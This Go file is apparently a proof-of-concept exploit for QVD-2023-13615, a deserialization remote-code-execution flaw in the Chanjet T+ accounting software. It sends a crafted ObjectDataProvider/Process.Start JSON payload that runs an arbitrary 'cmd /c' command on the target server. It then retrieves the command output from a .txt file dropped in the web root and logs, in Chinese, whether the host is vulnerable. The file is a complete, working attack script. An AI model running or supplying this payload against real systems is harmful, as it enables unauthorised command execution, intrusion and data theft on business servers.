package poc

import (
	"bytes"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"net/http"
	"regexp"
	"strings"
)

func GenerateRandomString(length int) (string, error) {
	bytes := make([]byte, length)
	_, err := rand.Read(bytes)
	if err != nil {
		return "", err
	}
	return base64.URLEncoding.EncodeToString(bytes)[:length] + ".txt", nil
}

func QVD_2023_13615(target string, cmd string) {
	url := strings.TrimRight(target, "/")
	requestBody := fmt.Sprintf(`{"storeID":{"__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35","MethodName":"Start","ObjectInstance":{"__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089","StartInfo": {"__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089","FileName":"cmd","Arguments":"/c %s"}}}}`, cmd)
	// 创建自定义的Transport
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}
	match := regexp.MustCompile(`(\S+\.txt)$`).FindStringSubmatch(cmd)
	if len(match) < 2 {
		fmt.Println("Error")
	}
	filename := match[1]
	req, err := http.NewRequest("POST", url+"/tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore", nil)
	if err != nil {
		fmt.Println(err)
	}

	req.Header.Set("X-Ajaxpro-Method", "GetStoreWarehouseByStore")
	req.Body = io.NopCloser(bytes.NewBuffer([]byte(requestBody)))

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println(err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println(err)
	}

	reqCmd, err := http.NewRequest("GET", fmt.Sprintf(url+"/tplus/%s", filename), nil)
	if err != nil {
		fmt.Println(err)
	}
	respCmd, err := client.Do(reqCmd)
	if err != nil {
		fmt.Println(err)
	}
	defer respCmd.Body.Close()
	bodycmd, err := io.ReadAll(respCmd.Body)
	if err != nil {
		fmt.Println(err)
	}
	regCmd := regexp.MustCompile("出错页")
	magCmd := regCmd.MatchString(string(bodycmd))

	// 获取结果
	reg := regexp.MustCompile("\"error\":..([^\\\"]+)")
	mag := reg.MatchString(string(body))

	if !magCmd && resp.StatusCode == 200 && mag && respCmd.StatusCode == 200 {
		log.Println("[+] 存在畅捷通T+反序列化rce漏洞")
		log.Println("[+] 命令执行结果为：", string(bodycmd))
	} else if magCmd && resp.StatusCode == 200 && mag {
		log.Println("[-] 畅捷通T+反序列化rce漏洞存在但无回显")
	} else if (resp.StatusCode != 200 && !mag) || (resp.StatusCode == 200 && !mag) {
		//log.Println(resp.StatusCode, mag)
		log.Println("[-] 不存在畅捷通T+反序列化rce漏洞")
	} else {
		log.Println("Error: Unknown error")
	}

}
